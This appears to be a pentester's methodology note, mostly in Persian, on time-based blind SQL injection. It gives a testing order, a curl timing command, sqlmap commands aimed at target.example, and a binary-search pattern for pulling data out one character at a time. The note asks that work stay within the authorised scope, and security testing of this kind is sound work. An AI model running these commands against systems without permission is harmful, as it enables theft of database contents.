---
tags: [web, sqli, blind, time-based]
---

# Time-Based SQL Injection

## ایده اصلی

اگر محتوای پاسخ تفاوتی ندارد، از تأخیر شرطی برای ساخت کانال True/False استفاده کن. ابتدا تأخیر بدون شرط را اثبات کن، بعد شرط را اضافه کن.

## ترتیب آزمون

1. سه Baseline زمانی بگیر.
2. تأخیر ۳ تا ۵ ثانیه‌ای را آزمایش کن.
3. آزمایش را چند بار تکرار کن.
4. با شرط True و False کنترل بگیر.
5. برای استخراج، ابتدا طول داده را کم و فقط در محدوده مجاز ادامه بده.

## زمان‌سنجی با curl

```bash
curl -sS -o /dev/null \
  -w 'status=%{http_code} time=%{time_total}\n' \
  'https://target.example/item.php?id=1'
```

پیلود را URL-encode نکن، مگر اینکه آن را در مقدار پارامتر به‌صورت دستی جایگذاری می‌کنی؛ برای آزمون دقیق معمولاً ارسال از Burp Repeater یا فایل درخواست ساده‌تر است.

## sqlmap مخصوص Time-Based

```bash
sqlmap -u "https://target.example/item.php?id=1" \
  --technique=T --time-sec=5 --batch
```

اگر پارامتر مشخص است:

```bash
sqlmap -r request.txt -p username \
  --technique=T --time-sec=5 --batch
```

## دستورهای دیتابیس‌ها

- [[MySQL Time-Based]]
- [[PostgreSQL Time-Based]]
- [[MSSQL Time-Based]]

## الگوی استخراج شرطی

```text
delay if ASCII(SUBSTRING(value, position, 1)) > midpoint
```

با جست‌وجوی دودویی به‌جای بررسی همه مقادیر، تعداد درخواست‌ها را کم کن. Threshold تأخیر را از میانگین Baseline جدا کن و خطای شبکه را در نظر بگیر.

## نتیجه آزمون

- میانگین Baseline:
- تأخیر پیلود:
- تعداد تکرار:
- نتیجه True/False:
- مدرک:
